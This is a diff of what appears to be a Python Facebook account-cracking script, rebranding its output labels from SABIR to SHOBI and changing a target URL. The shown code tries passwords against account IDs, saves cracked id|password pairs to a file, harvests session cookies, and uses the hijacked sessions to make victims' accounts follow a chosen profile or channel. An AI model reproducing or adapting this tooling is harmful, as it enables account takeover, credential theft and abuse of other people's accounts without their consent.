@@ -638,7 +638,7 @@ def crack(idf,pwv):
 
 				cp +=1
 
-				print( f'\r\x1b[1;91m [ SABIR-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ SHOBI-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -652,7 +652,7 @@ def crack(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ SABIR-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ SHOBI-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
@@ -752,7 +752,7 @@ def follow(ses,coki):
 
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://youtube.com/channel/UCY5JxJv23l68mkcal--r6ug', cookies={'cookie': coki}).text, 'html.parser')
 
 	get = r.find('a', string='Follow').get('href')
 
